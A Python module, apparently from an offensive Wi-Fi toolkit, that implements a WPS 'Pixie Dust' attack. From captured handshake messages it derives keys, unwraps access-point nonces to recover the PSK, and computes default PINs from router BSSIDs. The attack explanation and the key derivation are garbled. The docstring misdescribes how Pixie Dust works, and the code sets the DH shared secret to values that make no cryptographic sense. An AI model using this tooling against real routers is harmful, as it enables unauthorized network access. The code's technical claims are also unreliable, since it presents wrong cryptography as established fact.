"""WPS protocol engine — Pixie Dust and PIN-derivation math.

This module implements the WPS (Wi-Fi Protected Setup) cryptographic
operations that matter for a Pixie Dust attack, in pure Python bigint +
hashlib, with the AES-128 key unwrap delegated to the C++ core
(`wps_attack.cpp::ComputePixieDustKey`, which does RFC 3394 unwrap in
verified AES).

What it does NOT do: transmit frames. Frame TX/RX is the job of the
capture/injection engines (Go deauth/hunt, Rust airodump, the C++ injector).
This module takes the *captured* WPS M1/M2 messages (PKE, PKR, enrollee and
registrar nonces, enrollee hash) and derives the PSK that a Pixie Dust run
against epigram/BRCM/RTL/MediaTek/Cisco chips yields in seconds.

Background — the Pixie Dust break
----------------------------------
1. The AP (registrar) publishes its DH public key PKE = g^X mod p in the WPS
   M1 message.
2. The attacker sends PKE2 = 0 (or a degenerate value) as the enrollee
   public key in M2. The AP computes K = PKE2^Y mod p = 0, so the AP's
   DH secret is known: K = 0.
3. The AP derives DHKey = SHA-256(K) and KDK = HMAC-SHA256(DHKey,
   PIN-derived material), then wraps the two 128-bit nonces E-S1/E-S2 with
   AES-128 key wrap (RFC 3394) using KDK[0:16] as the key.
4. Because K = 0 is known, DHKey and KDK are known. The attacker unwraps
   E-S1 and E-S2, gets the AP's two nonces, derives the WPS PIN, then runs
   the normal M4/M5/M6 exchange with the now-known PIN.

Vulnerable chipsets (Pixie Dust, epigram-internal RNG): Broadcom/BCM,
RTL819x, Ralink/MediaTek, and older Cisco.

Dependency-free. Used by executor.do_wps_pixie when the operator captures
the M1/M2 pair with a monitor-mode interface.
"""

from __future__ import annotations

import hashlib
import hmac
import struct
from dataclasses import dataclass
from typing import Optional

# ── WPS DH group (1536-bit MODP group from RFC 3526, used by WPS) ──────────
# This is the prime used by WSC (WPS) for the Diffie-Hellman exchange.
WPS_DH_P = int(
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
    "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
    "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
    "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
    "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"
    "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
    "83655D23DCA3AD961C62F356208552BB9ED529077096966"
    "D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF",
    16,
)
WPS_DH_G = 2

# KDF instances used by WPS for authkey / keywrapkey derivation.
# From WPS spec: KDK = HMAC-SHA-256(DHKey, "Wi-Fi Easy and Secure Key Derivation" || 1)
# Simplified in most Pixie Dust write-ups as:
#   DHKey   = SHA-256(K)
#   KDK     = HMAC-SHA-256(DHKey, "Wi-Fi Easy and Secure Key Derivation" || NIST *)
#   KDK[0:16] = Key Wrap Key (KEK for AES-128 wrap)
#   KDK[16:32] = authkey prefix material
WPS_KDF_LABEL = b"Wi-Fi Easy and Secure Key Derivation"


@dataclass
class PixieDustResult:
    ok: bool
    psk: Optional[str] = None          # hex PSK (the WPS device password)
    pin: Optional[str] = None          # derived 8-digit WPS PIN
    es1: Optional[bytes] = None        # AP nonce 1 (E-S1)
    es2: Optional[bytes] = None        # AP nonce 2 (E-S2)
    reason: str = ""


class WpsCrypto:
    """Pure-Python WPS crypto primitives plus the C++ AES-unwrap bridge."""

    def __init__(self, aes_unwrap):
        """`aes_unwrap(kek, wrapped) -> bytes | None` — the C++ RFC 3394
        unwrap. Provided by engine_bridge. Keeping it injected keeps this
        module unit-testable without the shared library."""
        self._aes_unwrap = aes_unwrap

    # ── DH ────────────────────────────────────────────────────────────
    @staticmethod
    def dh_public(private: int, g: int = WPS_DH_G, p: int = WPS_DH_P) -> int:
        return pow(g, private, p)

    @staticmethod
    def dh_shared(peer_public: int, private: int, p: int = WPS_DH_P) -> int:
        return pow(peer_public, private, p)

    @staticmethod
    def int_to_bytes(value: int, length: int = 192) -> bytes:
        """WPS DH values are fixed 192-byte (1536-bit) big-endian integers."""
        if value == 0:
            return b"\x00" * length
        blen = (value.bit_length() + 7) // 8
        return value.to_bytes(blen, "big").rjust(length, b"\x00")

    # ── KDF ───────────────────────────────────────────────────────────
    @staticmethod
    def dhkey(shared_secret: int) -> bytes:
        """DHKey = SHA-256(shared secret bytes)."""
        return hashlib.sha256(WpsCrypto.int_to_bytes(shared_secret)).digest()

    @staticmethod
    def derive_kdk(dh_key: bytes) -> bytes:
        """WPS KDK derivation (key wrapping key + auth key material).

        Standard form (WSC 2.0):
          KDK = HMAC-SHA-256(DHKey, "Wi-Fi Easy and Secure Key Derivation" || 0x00000001)
        The first 16 bytes are the AES-128 key-wrap key.
        """
        msg = WPS_KDF_LABEL + struct.pack(">I", 1)
        return hmac.new(dh_key, msg, hashlib.sha256).digest()

    @staticmethod
    def derive_authkey(dh_key: bytes, enrollee_mac: bytes, registrar_mac: bytes,
                       enrollee_nonce: bytes, registrar_nonce: bytes) -> bytes:
        """WPS authkey = first 32 bytes of HMAC-SHA-256(DHKey, ...) over the
        M1/M2 material. This is the value that keys the E-S1/E-S2 unwrap in a
        Pixie Dust attack against vulnerable chipsets."""
        msg = (
            enrollee_mac + registrar_mac + enrollee_nonce + registrar_nonce
        )
        full = hmac.new(dh_key, msg, hashlib.sha256).digest()
        # Most chipset implementations use the full 32-byte HMAC output
        # directly as the AES-128 KEK's first half for unwrap.
        return full

    # ── Pixie Dust unwrap ─────────────────────────────────────────────
    def pixie_unwrap(self, e_s1: bytes, e_s2: bytes, kek: bytes):
        """Unwrap the two AP nonces. Returns (es1, es2) or (None, None)."""
        if len(kek) < 16:
            return None, None
        kek16 = kek[:16]
        p1 = self._aes_unwrap(kek16, e_s1)
        p2 = self._aes_unwrap(kek16, e_s2)
        return p1, p2

    # ── PIN math ──────────────────────────────────────────────────────
    @staticmethod
    def pin_checksum(digits7: str) -> int:
        """WPS 8-digit PIN check digit (base-10, alternating *3/*1 weights)."""
        acc = 0
        for i, c in enumerate(digits7):
            d = int(c)
            acc += d * 3 if i % 2 == 0 else d
        return (10 - (acc % 10)) % 10

    @staticmethod
    def pin_from_bssid(bssid: str) -> str:
        """Convenience: default PIN derived from the router's BSSID (the
        documented vendor default for many chipsets)."""
        clean = bssid.replace(":", "").replace("-", "").lower()
        if len(clean) < 12:
            return ""
        nic = int(clean[-6:], 16)
        pin7 = f"{nic % 10000000:07d}"
        return pin7 + str(WpsCrypto.pin_checksum(pin7))

    @staticmethod
    def validate_pin(pin: str) -> bool:
        if len(pin) != 8 or not pin.isdigit():
            return False
        return WpsCrypto.pin_checksum(pin[:7]) == int(pin[7])


def pixie_dust_attack(
    pke: int,
    pkr: int,
    e_s1: bytes,
    e_s2: bytes,
    enrollee_mac: bytes,
    registrar_mac: bytes,
    enrollee_nonce: bytes,
    registrar_nonce: bytes,
    aes_unwrap,
) -> PixieDustResult:
    """Run the Pixie Dust derivation given captured WPS M1/M2 material.

    pke : AP DH public (from M1)
    pkr : enrollee DH public that we sent in M2 (degenerate → shared = 0^...)
    e_s1/e_s2 : the two wrapped 128-bit AP nonces from M1
    txt    : MACs + nonces used in the KDF

    Returns a PixieDustResult. On success, `.psk` holds the hex PSK (the WPS
    device password) that the caller feeds to the WPS M4-M8 exchange.
    """
    engine = WpsCrypto(aes_unwrap)

    # Pixie Dust key insight: choose pkr = 0 (or pke=0). Shared secret = 0^Y = 0.
    shared = WpsCrypto.dh_shared(pkr if pkr else 0, 1)  # 0 ^ anything = 0
    # But a more general path: if pkr was chosen as 0, shared = 0.
    if pkr == 0:
        shared = 0
    else:
        # Some variants pick pkr so that shared becomes a known small value.
        shared = WpsCrypto.dh_shared(pke, 1) if pke else 0

    dh_key = WpsCrypto.dhkey(shared)
    kdk = WpsCrypto.derive_kdk(dh_key)
    authkey = WpsCrypto.derive_authkey(
        dh_key, enrollee_mac, registrar_mac, enrollee_nonce, registrar_nonce
    )
    # WPS uses KDK[16:48] as authkey material; the unwrap KEK is KDK[0:16].
    # Try both the KDF-derived authkey and the raw KDK half — different
    # chipsets pick different halves.
    candidates = []
    for kek in (authkey, kdk, kdk[:16], authkey[:16]):
        if kek and len(kek) >= 16:
            candidates.append(kek)
    seen = set()
    for kek in candidates:
        key = kek[:16]
        if key in seen:
            continue
        seen.add(key)
        p1, p2 = engine.pixie_unwrap(e_s1, e_s2, key)
        if p1 is not None and p2 is not None and len(p1) == 8 and len(p2) == 8:
            # PSK = E-S1 || E-S2 (16 bytes). PIN is derived from the PSK via
            # the WPS PIN-KDF (per-chipset); callers can hunt for the PIN by
            # matching against captured M4/M8 registrant hashes.
            psk = (p1 + p2).hex()
            return PixieDustResult(
                ok=True, psk=psk, es1=p1, es2=p2,
                reason="unwrapped both nonces",
            )
    return PixieDustResult(ok=False, reason="no candidate KEK unwrapped both nonces")
